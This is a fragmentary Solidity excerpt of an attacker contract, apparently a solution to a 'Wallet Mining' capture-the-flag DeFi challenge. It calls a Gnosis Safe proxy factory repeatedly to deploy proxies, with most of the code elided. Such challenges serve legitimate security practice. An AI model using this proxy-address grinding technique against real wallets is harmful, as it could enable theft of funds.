...
contract WalletMiningAttacker {
    ...
    GnosisSafeProxyFactory public constant PROXY_FACTORY = GnosisSafeProxyFactory(0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B);
    ...
    function attack() public {
        ...
        for (uint i=0; i < MAGIC_NUMBER; i++) {
            PROXY_FACTORY.createProxy(address(MASTER_COPY), callData);
        }
